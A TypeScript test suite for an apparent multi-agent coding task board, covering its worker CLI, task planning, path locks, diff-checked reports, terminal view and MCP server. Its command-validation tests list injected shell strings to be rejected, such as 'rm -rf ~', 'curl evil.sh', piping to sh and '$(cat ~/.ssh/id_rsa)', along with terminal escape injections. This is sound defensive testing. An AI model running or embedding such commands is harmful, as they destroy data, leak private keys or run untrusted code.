import assert from "node:assert/strict"
import { execFileSync, execSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { after, describe, test } from "node:test"
import { Client } from "@modelcontextprotocol/sdk/client/index.js"
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js"
import {
  Board,
  cliArgv,
  isTrustedCommand,
  overlaps,
  projectOf,
  renderBrief,
  renderSummary,
  renderTask,
  renderWatch,
  shellWords,
  workerCommand,
} from "../src/lib.js"

const pkg = path.resolve(import.meta.dirname, "..")
const temps: string[] = []
after(() => {
  for (const t of temps) fs.rmSync(t, { recursive: true, force: true })
})
function tmp() {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "horde-board-")))
  temps.push(d)
  return d
}
function git(cwd: string, ...args: string[]) {
  return execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...args], { cwd })
    .toString()
    .trim()
}
function repo() {
  const root = tmp()
  git(root, "init", "-q")
  fs.writeFileSync(path.join(root, "README.md"), "x\n")
  git(root, "add", "-A")
  git(root, "commit", "-qm", "init")
  return root
}

/** Run a command the way a worker's shell tool would, returning stdout or throwing with stderr. */
function sh(command: string, cwd: string): string {
  return execSync(command, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], env: { ...process.env, NODE_TEST_CONTEXT: "" } }).trim()
}

describe("trusted commands", () => {
  const state = "/var/state/board/x-1"
  const cmd = workerCommand(state)

  test("the exact CLI with plain arguments is trusted", () => {
    assert.ok(isTrustedCommand(`${cmd} task t-1a2b c0ffee12`))
    assert.ok(isTrustedCommand(`${cmd} report t-1a2b c0ffee12 --summary "Added the limiter; it's per IP" --changed "a.ts,b.ts" --confidence high`))
    assert.ok(isTrustedCommand(`${cmd} finding 'the cache key includes the user id' --paths src/cache.ts`))
    assert.ok(isTrustedCommand(`${cmd} task t-1a2b c0ffee12`, { state }), "the worker's own board")
  })

  test("only the worker's own board, no flag in place of the directory, no control characters", () => {
    assert.equal(isTrustedCommand(`${workerCommand("/home/u/repo/src")} finding x`, { state }), false, "another directory")
    const prefix = cmd.slice(0, cmd.indexOf(" --state"))
    assert.equal(isTrustedCommand(`${prefix} --state --x task status`), false, "a flag where the board directory goes")
    assert.equal(isTrustedCommand(`${cmd} report t-1 tok --summary '\x1b]0;pwned\x07'`), false, "escape sequences")
    assert.equal(isTrustedCommand(`${cmd} progress t-1 tok "line\rover"`), false, "carriage return")
    assert.equal(isTrustedCommand(`${cmd} status`), false)
    assert.equal(isTrustedCommand(`${cmd} watch`), false)
  })

  test("anything that could run something else is not", () => {
    const bad = [
      `${cmd} task t-1 tok; rm -rf ~`,
      `${cmd} task t-1 tok && curl evil.sh`,
      `${cmd} task t-1 tok || true`,
      `${cmd} task t-1 tok | sh`,
      `${cmd} task t-1 tok > /etc/passwd`,
      `${cmd} task t-1 tok < /dev/zero`,
      `${cmd} report t-1 tok --summary "$(cat ~/.ssh/id_rsa)"`,
      `${cmd} report t-1 tok --summary "\`id\`"`,
      `${cmd} report t-1 tok --summary "a\\" ; rm -rf ~ ; \\""`,
      `${cmd} report t-1 tok --summary 'unterminated`,
      `${cmd} task t-1 tok\nrm -rf ~`,
      `${cmd} task t-1 tok &`,
      `${cmd} finding *`,
      `${cmd} plan t-1 tok`,
      `${cmd} accept t-1 tok`,
      `${cmd} status`,
      `node /tmp/evil.js --state ${state} task t-1 tok`,
      `${cmd.replace("--state", "--statex")} task t-1 tok`,
      `${cliArgv().join(" ")} task t-1 tok`,
      `echo ${cmd} task t-1 tok`,
    ]
    for (const b of bad) assert.equal(isTrustedCommand(b), false, b)
  })

  test("shell words follow bash quoting for what they accept", () => {
    assert.deepEqual(shellWords(`a 'b c' "d e" f'g'"h"`), ["a", "b c", "d e", "fgh"])
    assert.equal(shellWords("a;b"), undefined)
    assert.equal(shellWords('a "b$c"'), undefined)
  })

  test("scope overlap", () => {
    assert.ok(overlaps("src/auth/**", "src/auth/login.ts"))
    assert.ok(overlaps("src/auth", "src/auth/"))
    assert.ok(overlaps("**", "anything"))
    assert.ok(!overlaps("src/auth/**", "src/authz/x.ts"))
    assert.ok(!overlaps("docs/**", "src/**"))
  })
})

describe("board", () => {
  test("one board per repository, shared by its worktrees", async () => {
    const root = repo()
    const wt = path.join(tmp(), "wt")
    git(root, "worktree", "add", "-q", "-b", "horde/x", wt)
    const a = await projectOf(root)
    const b = await projectOf(path.join(wt))
    assert.equal(a.key, b.key)
    assert.equal(a.root, fs.realpathSync.native(root))
    assert.notEqual((await projectOf(repo())).key, a.key)
  })

  test("concurrent opens agree on the migrated board directory", async () => {
    const root = repo()
    const state = tmp()
    const p = await projectOf(root)
    assert.ok(p.legacyKey)
    fs.mkdirSync(path.join(state, p.legacyKey), { recursive: true })
    const boards = await Promise.all(Array.from({ length: 10 }, () => Board.open(root, state)))
    assert.deepEqual(new Set(boards.map((b) => b.dir)), new Set([path.join(state, p.key)]))
  })

  test("plan: dependencies by title, cycles refused, parallel scope overlaps flagged (also against existing tasks)", async () => {
    const board = new Board(tmp())
    const r = await board.plan([
      { title: "API", goal: "Add the endpoint", scope: ["src/api/**"] },
      { title: "Docs", goal: "Document it", scope: ["docs/**"], deps: ["API"] },
      { title: "Client", goal: "Call it", scope: ["src/api/client.ts"] },
    ])
    const [api, docs, client] = r.tasks
    assert.deepEqual(docs!.deps, [api!.id])
    assert.equal(r.warnings.length, 1)
    assert.match(r.warnings[0]!, /"API" and "Client" both touch src\/api\/\*\* and may run in parallel/)
    const later = await board.plan([{ title: "Refactor", goal: "Tidy", scope: ["src/api/"] }])
    assert.equal(later.warnings.length, 2, later.warnings.join("\n"))
    await assert.rejects(board.plan([{ title: "Loop", goal: "x", deps: ["Loop"] }]), /depends on itself/)
    await assert.rejects(board.plan([{ title: "x", goal: "y", deps: ["nope"] }]), /unknown dependency "nope"/)
    assert.deepEqual(
      board.ready().map((t) => t.title),
      ["API", "Client", "Refactor"],
    )
    await assert.rejects(board.assign(docs!.id), /waits for/)
    void client
  })

  test("a full attempt through the worker CLI, as a worker would run it", async () => {
    const root = repo()
    const board = await Board.open(root, tmp())
    const [api, docs] = (
      await board.plan([
        { title: "API", goal: "Add rate limiting to the login endpoint.", acceptance: ["429 after 5 failures per minute"], scope: ["src/api/**"] },
        { title: "Docs", goal: "Document the limit.", scope: ["docs/**"], deps: ["API"] },
      ])
    ).tasks
    await board.remember("The API returns errors as { error: { code, message } }.", { paths: ["src/api/**"], tags: ["api"] })
    const { attempt } = await board.assign(api!.id, "auth-worker")
    const { renderBrief } = await import("../src/render.js")
    const brief = renderBrief(board, board.task(api!.id), attempt)
    assert.match(brief, /^# Task t-\w+: API\n\nAdd rate limiting/)
    assert.match(brief, /429 after 5 failures per minute/)
    assert.match(brief, /Work in: src\/api\/\*\*/)
    assert.match(brief, /Project notes[\s\S]*errors as \{ error/)
    // Every command in the brief must be one the runtime trusts, and must work through a real shell.
    const prefix = workerCommand(board.dir)
    const commands = brief
      .split("\n")
      .filter((l) => l.includes(prefix))
      .map((l) => l.slice(l.indexOf(prefix)))
    assert.ok(commands.length >= 5, commands.join("\n"))
    for (const c of commands) assert.ok(isTrustedCommand(c), `brief command is not trusted: ${c}`)

    const cmd = workerCommand(board.dir)
    const run = (args: string) => sh(`${cmd} ${args}`, root)
    assert.match(run(`task ${api!.id} ${attempt.token}`), /API" — working/)
    assert.equal(run(`progress ${api!.id} ${attempt.token} "writing the limiter"`), "noted")
    assert.match(run(`finding "login reuses the session middleware" --paths "src/api/login.ts" --task ${api!.id} --token ${attempt.token}`), /^shared as n-/)
    assert.match(run(`lock ${api!.id} ${attempt.token} "src/shared/rate.ts"`), /locked src\/shared\/rate\.ts/)

    // Another task cannot take the same path.
    const other = (await board.plan([{ title: "Other", goal: "x" }])).tasks[0]!
    const second = await board.assign(other.id)
    assert.throws(() => run(`lock ${other.id} ${second.attempt.token} "src/shared"`), /refused: src\/shared\/rate\.ts is locked by t-/)
    assert.throws(() => run(`task ${api!.id} wrongtoken`), /token does not match/)

    assert.match(
      run(
        `report ${api!.id} ${attempt.token} --summary "Added a sliding-window limiter, it's per IP" --changed "src/api/login.ts,src/shared/rate.ts" --tests "test/api/login.test.ts" --unverified "did not load-test" --question "Should the limit be configurable?" --confidence medium`,
      ),
      /report filed/,
    )
    const t = board.task(api!.id)
    assert.equal(t.status, "review")
    assert.deepEqual(t.reports[0]!.filesChanged, ["src/api/login.ts", "src/shared/rate.ts"])
    assert.deepEqual(t.reports[0]!.unverifiedClaims, ["did not load-test"])

    const summary = renderSummary(board)
    assert.match(summary, /^3 tasks: 1 claimed, 1 review, 1 open/)
    assert.match(summary, /review {2}t-\w+ "API": Added a sliding-window limiter.*\(confidence medium, 1 unverified, 1 question\(s\)\)/)
    assert.match(summary, /locks {3}src\/shared\/rate\.ts → t-/)
    // Humans read the same from the command line.
    const human = `${cliArgv().join(" ")} status --state "${board.dir.replace(/\\/g, "/")}"`
    assert.match(sh(human, root), /^3 tasks: 1 claimed, 1 review, 1 open/)
    assert.match(sh(`${human} ${api!.id}`, root), /API" — review[\s\S]*sliding-window limiter/)
    // Without a terminal, watch prints one frame and exits.
    assert.match(sh(human.replace(" status ", " watch "), root), /^horde · [^\n]*1 review, 1 claimed, 1 open[\s\S]*TASK +STATUS +TITLE/)

    // The finding reaches the next brief that touches the same paths.
    await board.accept(api!.id, { cost: 0.04 })
    assert.equal(board.locks().length, 0, "accepting releases the task's locks")
    assert.deepEqual(
      board.ready().map((x) => x.id),
      [docs!.id],
    )
    const docsAttempt = await board.assign(docs!.id)
    assert.doesNotMatch(renderBrief(board, board.task(docs!.id), docsAttempt.attempt), /session middleware/, "unrelated paths: not included")
    board.task(docs!.id).scope.push("src/api/**")
    await board.edit(docs!.id, { scope: ["docs/**", "src/api/**"] })
    assert.match(renderBrief(board, board.task(docs!.id), docsAttempt.attempt), /Findings from other workers[\s\S]*session middleware/)
  })

  test("horde watch: the board as a terminal frame, sized, ordered by what needs attention", async () => {
    const board = new Board(tmp())
    const { tasks } = await board.plan([
      { title: "API limiter", goal: "x" },
      { title: "Docs", goal: "y", deps: ["API limiter"] },
      { title: "Cleanup", goal: "z" },
    ])
    const [api, docs, cleanup] = tasks
    const { attempt } = await board.assign(api!.id, "wa")
    await board.recordActivity(api!.id, attempt.n, { cost: 1.5, state: "idle", gate: "pass 1/2" })
    await board.report(api!.id, attempt.token, { summary: "done" })
    await board.assign(cleanup!.id, "wc")
    const now = Date.now()
    const tiers = [{ model: "deepseek/flash" }]
    const frame = renderWatch(board, { selected: 1 }, { width: 120, height: 20, now, tiers, title: "repo" })
    assert.equal(frame.lines.length, 20, "fills the terminal exactly")
    assert.ok(
      frame.lines.every((l) => l.length <= 120),
      "never wider than the terminal",
    )
    assert.match(frame.lines[0]!, /^horde · repo · 1 review, 1 claimed, 1 open · \$1\.50 +\d\d:\d\d:\d\d$/)
    // Review first (it needs a decision), then running, then open.
    assert.deepEqual(frame.order, [api!.id, cleanup!.id, docs!.id])
    const row = (id: string) => frame.lines.find((l) => l.includes(id))!
    assert.match(row(api!.id), /^ {2}t-\w+ +review +API limiter +tier 0 \(deepseek\/flash\)/)
    assert.match(row(cleanup!.id), /^▸ t-\w+ +claimed .*#1 wc seen 0s ago/)
    assert.match(frame.lines.join("\n"), /recent\n.*plan[\s\S]*assign[\s\S]*report +t-/)
    assert.match(frame.lines.at(-1)!, /enter details · q quit/)
    // Narrow terminals keep the essentials.
    const narrow = renderWatch(board, { selected: 0 }, { width: 60, height: 12, now })
    assert.ok(narrow.lines.every((l) => l.length <= 60))
    assert.match(narrow.lines.join("\n"), /review +API limiter/)
    // A task opened in full, scrolled.
    const text = renderTask(board.task(api!.id), "full")
    const detail = renderWatch(board, { selected: 0, detail: { id: api!.id, text, scroll: 1 } }, { width: 80, height: 10, now })
    assert.equal(detail.lines.length, 10)
    assert.ok(!detail.lines.includes(text.split("\n")[0]!), "scrolled past the first line")
    assert.match(detail.lines.at(-1)!, /esc back/)
    // Colors only when asked for.
    assert.ok(!frame.lines.join("").includes("\x1b["))
    assert.ok(renderWatch(board, { selected: 0 }, { width: 120, height: 20, now, color: true }).lines.join("").includes("\x1b[33mreview"))
  })

  test("attempt costs are recorded as they accrue and summed per task", async () => {
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const first = await board.assign(t.id)
    await board.recordActivity(t.id, first.attempt.n, { cost: 0.5, state: "running" })
    assert.equal(board.task(t.id).attempts[0]!.activity?.state, "running")
    assert.equal(board.task(t.id).cost, 0.5)
    // A late snapshot with an older cost must not lower the attempt's spend.
    await board.recordActivity(t.id, first.attempt.n, { cost: 0.2 })
    assert.equal(board.task(t.id).cost, 0.5)
    await board.fail(t.id, { reason: "nope" })
    const second = await board.assign(t.id)
    await board.recordActivity(t.id, second.attempt.n, { cost: 0.25 })
    await board.recordActivity(t.id, second.attempt.n, { cost: 0.75, state: "idle", gate: "pass 1/2" })
    assert.equal(board.task(t.id).cost, 1.25)
    await board.accept(t.id, {})
    assert.equal(board.task(t.id).attempts[1]!.cost, 0.75, "accept keeps the recorded cost")
    await assert.rejects(board.recordActivity(t.id, 9, { cost: 1 }), /has no attempt 9/)
  })

  test("a new attempt invalidates the old token; failing can escalate the tier or give up", async () => {
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const first = await board.assign(t.id)
    const second = await board.assign(t.id)
    assert.equal(board.task(t.id).attempts[0]!.outcome, "abandoned")
    await assert.rejects(board.report(t.id, first.attempt.token, { summary: "late" }), /token does not match/)
    await board.seen(t.id, second.attempt.token)
    const failed = await board.fail(t.id, { reason: "gate failed twice", escalate: true })
    assert.equal(failed.status, "open")
    assert.equal(failed.tier, 1)
    await board.assign(t.id)
    assert.equal((await board.fail(t.id, { reason: "out of tiers", retry: false })).status, "failed")
  })

  test("given the repository, a brief carries code context within its budget", async () => {
    const root = repo()
    fs.mkdirSync(path.join(root, "src/api"), { recursive: true })
    fs.writeFileSync(path.join(root, "src/api/login.ts"), "export function login(user: string) {\n  return user\n}\n")
    fs.writeFileSync(path.join(root, "src/api/login.test.ts"), "import { login } from './login.js'\nlogin('a')\n")
    fs.writeFileSync(path.join(root, "CLAUDE.md"), "Prefer small functions.\n")
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "Rate-limit login", goal: "Make `login` refuse after 5 failures.", scope: ["src/api/**"] }])).tasks[0]!
    const { attempt } = await board.assign(t.id)
    const brief = renderBrief(board, board.task(t.id), attempt, 6000, root)
    assert.match(brief, /## Reporting \(required\)[\s\S]*## Code context\n\n### src\/api\/login\.ts\n1 {2}export function login/)
    assert.match(brief, /- src\/api\/login\.ts: src\/api\/login\.test\.ts \(naming\)/)
    assert.match(brief, /### CLAUDE\.md \(project conventions\)\nPrefer small functions\./)
    assert.ok(brief.length <= 6000 * 4 + 200, `${brief.length}`)
    assert.doesNotMatch(renderBrief(board, board.task(t.id), attempt, 6000), /## Code context/, "no repository, no code context")
    // A small budget keeps the required sections and drops code context first.
    const small = renderBrief(board, board.task(t.id), attempt, 700, root)
    assert.match(small, /## Reporting \(required\)/)
    assert.doesNotMatch(small, /## Code context/)
  })

  test("a report is checked against the attempt's diff", async () => {
    const root = repo()
    const base = git(root, "rev-parse", "HEAD")
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const { attempt } = await board.assign(t.id, "w")
    await board.bindWorkspace(t.id, attempt.token, { path: root, base })
    await assert.rejects(board.bindWorkspace(t.id, "nope", { path: root, base }), /no longer current/)
    fs.writeFileSync(path.join(root, "README.md"), "changed\n")
    fs.writeFileSync(path.join(root, "extra.ts"), "new\n")
    await board.report(t.id, attempt.token, { summary: "did it", filesChanged: ["./README.md"], testsAdded: ["readme.test.ts"] })
    const check = (await board.checkReport(t.id))!
    assert.deepEqual(check, { claimedNotChanged: ["readme.test.ts"], changedNotReported: ["extra.ts"], diff: ["README.md", "extra.ts"] })
    const shown = renderTask(board.task(t.id), "brief", Date.now(), check)
    assert.match(shown, /⚠ claimed but not in the diff: readme\.test\.ts\n {2}⚠ in the diff but not in the report: extra\.ts/)
    fs.rmSync(path.join(root, "extra.ts"))
    await board.report(t.id, attempt.token, { summary: "again", filesChanged: ["README.md"] })
    assert.match(renderTask(board.task(t.id), "brief", Date.now(), await board.checkReport(t.id)), /✓ the report matches the diff \(1 file\)/)
    fs.rmSync(root, { recursive: true, force: true })
    assert.equal(await board.checkReport(t.id), undefined, "no workspace left: nothing to check")
  })

  test("notes: duplicates collapse, recall ranks by overlap, forget hides", async () => {
    const board = new Board(tmp())
    const a = await board.remember("Use pnpm, not npm.", { tags: ["tooling"] })
    const again = await board.remember("use pnpm, not npm.", { tags: ["tooling"] })
    assert.equal(a.id, again.id)
    await board.remember("Dates are stored in UTC.", { paths: ["src/db/**"] })
    assert.equal(board.memory({ query: "which package manager pnpm" })[0]!.id, a.id)
    assert.match(board.memory({ paths: ["src/db/models.ts"] })[0]!.text, /UTC/)
    await board.forget(a.id)
    assert.equal(
      board.memory().some((n) => n.id === a.id),
      false,
    )
    await assert.rejects(board.forget("n-nothing"), /no note/)
  })
})

describe("MCP server", () => {
  test("plan, brief and summary over stdio", async () => {
    const root = repo()
    const client = new Client({ name: "test", version: "0" })
    await client.connect(
      new StdioClientTransport({
        command: process.execPath,
        args: ["--conditions=source", "--import", "tsx", path.join(pkg, "src/index.ts")],
        cwd: pkg,
        env: { ...(process.env as Record<string, string>), HORDE_BOARD_DIRECTORY: root, HORDE_BOARD_STATE_DIR: tmp() },
        stderr: "inherit",
      }),
    )
    try {
      const call = async (name: string, args: Record<string, unknown> = {}) => {
        const res = (await client.callTool({ name, arguments: args })) as { content: { text: string }[]; isError?: boolean }
        const text = res.content.map((c) => c.text).join("\n")
        if (res.isError) throw new Error(text)
        return text
      }
      const tools = (await client.listTools()).tools.map((t) => t.name)
      for (const t of ["board_plan", "board_next", "board_brief", "board_accept", "board_fail", "board_summary", "board_task", "board_remember"])
        assert.ok(tools.includes(t), t)
      const planned = await call("board_plan", {
        tasks: [
          { title: "One", goal: "Do one" },
          { title: "Two", goal: "Do two", deps: ["One"] },
        ],
      })
      const id = planned.match(/^(t-\w+) "One"/m)![1]!
      assert.match(await call("board_next"), new RegExp(`^${id} "One"`))
      assert.match(await call("board_brief", { id, agent: "w1" }), /# Task t-\w+: One[\s\S]*report t-\w+ \w+ --summary/)
      assert.match(await call("board_summary"), /2 tasks: 1 claimed, 1 open[\s\S]*working t-\w+ "One" \(agent w1, attempt 1, worker not seen yet\)/)
      await assert.rejects(call("board_task", { id: "t-zzzz" }), /no task t-zzzz/)
    } finally {
      await client.close()
    }
  })
})

describe("board rules found in review", () => {
  test("notes forgotten and added again come back; findings from the CLI need their attempt", async () => {
    const board = new Board(tmp())
    const n = await board.remember("use pnpm")
    await board.forget(n.id)
    assert.equal(board.memory().length, 0)
    await board.remember("use pnpm")
    assert.deepEqual(
      board.memory().map((x) => x.text),
      ["use pnpm"],
    )
    assert.throws(() => sh(`${workerCommand(board.dir)} finding "unattributed fact"`, tmp()), /finding needs --task/)
  })

  test("a new attempt frees the old one's locks; closing twice is refused; block ends the attempt", async () => {
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const first = await board.assign(t.id)
    assert.deepEqual(await board.lock(t.id, first.attempt.token, ["src/x.ts"]), { ok: true })
    const second = await board.assign(t.id)
    assert.deepEqual(await board.lock(t.id, second.attempt.token, ["src/x.ts"]), { ok: true }, "not blocked by its own task's old lock")
    await board.fail(t.id, { reason: "nope", escalate: true })
    await assert.rejects(board.fail(t.id, { reason: "retried call", escalate: true }), /no running attempt/)
    assert.equal(board.task(t.id).tier, 1, "escalated once")
    const third = await board.assign(t.id)
    await board.lock(t.id, third.attempt.token, ["src/y.ts"])
    await board.block(t.id, "a decision")
    assert.equal(board.task(t.id).attempts[2]!.outcome, "abandoned")
    assert.equal(board.locks().length, 0, "a blocked task holds no locks")
    await board.edit(t.id, { status: "open" })
    await board.accept(t.id, { cost: 0.5 })
    assert.equal(board.task(t.id).blockedOn, undefined)
    await assert.rejects(board.accept(t.id), /already done/)
    await assert.rejects(board.fail(t.id, { reason: "late" }), /is done/)
  })

  test("locks are specific paths; reports are capped item by item; renames count on both sides", async () => {
    const root = repo()
    const board = await Board.open(root, tmp())
    const t = (await board.plan([{ title: "x", goal: "y" }])).tasks[0]!
    const { attempt } = await board.assign(t.id)
    for (const bad of ["**", "/etc/passwd", "../other", "*", "."]) await assert.rejects(board.lock(t.id, attempt.token, [bad]), /cannot lock/, bad)
    const long = "q".repeat(5000)
    await board.report(t.id, attempt.token, { summary: "s", questions: Array.from({ length: 40 }, (_, i) => `${i}${long}`) })
    const r = board.task(t.id).reports[0]!
    assert.ok(JSON.stringify(r).length <= 4000, String(JSON.stringify(r).length))
    assert.ok(r.questions.every((q) => q.length <= 300))
    // A rename reported as both paths is not a false claim.
    fs.writeFileSync(path.join(root, "a.ts"), "export const a = 1\n")
    git(root, "add", "a.ts")
    git(root, "commit", "-qm", "a")
    const base = git(root, "rev-parse", "HEAD")
    const t2 = (await board.plan([{ title: "rename", goal: "z" }])).tasks[0]!
    const a2 = (await board.assign(t2.id)).attempt
    await board.bindWorkspace(t2.id, a2.token, { path: root, base })
    git(root, "mv", "a.ts", "b.ts")
    await board.report(t2.id, a2.token, { summary: "renamed", filesChanged: ["a.ts", path.join(root, "b.ts")] })
    assert.deepEqual((await board.checkReport(t2.id))?.claimedNotChanged, [])
  })

  test("CLI flag values may start with dashes; the brief always keeps its reporting commands", async () => {
    const board = new Board(tmp())
    const t = (await board.plan([{ title: "x", goal: "g".repeat(20_000) }])).tasks[0]!
    const { attempt } = await board.assign(t.id)
    const brief = renderBrief(board, board.task(t.id), attempt, 500)
    assert.match(brief, / report t-\w+ \w+ --summary/)
    sh(`${workerCommand(board.dir)} report ${t.id} ${attempt.token} --summary "--dry-run is now the default"`, tmp())
    assert.equal(board.task(t.id).reports[0]!.summary, "--dry-run is now the default")
    assert.throws(() => sh(`${workerCommand(board.dir)} report ${t.id} ${attempt.token} --bogus x --summary y`, tmp()), /unknown flag --bogus/)
  })

  test("watch keeps the selected task across reorders and never draws wider than the terminal", async () => {
    const board = new Board(tmp())
    const { tasks } = await board.plan([
      { title: "A".repeat(60), goal: "x" },
      { title: "B", goal: "y" },
    ])
    const state = { selected: 1, selectedId: tasks[1]!.id }
    const before = renderWatch(board, state, { width: 50, height: 12 })
    assert.equal(before.order[before.selected], tasks[1]!.id)
    // B goes to review and moves to the top of the list: the selection follows it.
    const { attempt } = await board.assign(tasks[1]!.id)
    await board.report(tasks[1]!.id, attempt.token, { summary: "\x1b[2Jdone\r" })
    const after = renderWatch(board, state, { width: 50, height: 12 })
    assert.equal(after.order[after.selected], tasks[1]!.id)
    assert.ok(
      after.lines.every((l) => l.length <= 50),
      after.lines.join("\n"),
    )
    const detail = renderWatch(
      board,
      { selected: 0, detail: { id: tasks[1]!.id, text: renderTask(board.task(tasks[1]!.id), "full"), scroll: 999 } },
      { width: 50, height: 12 },
    )
    assert.ok(detail.scroll < 999, "the scroll is clamped")
    assert.ok(!detail.lines.join("").includes("\x1b[2J"), "worker text cannot drive the terminal")
  })
})
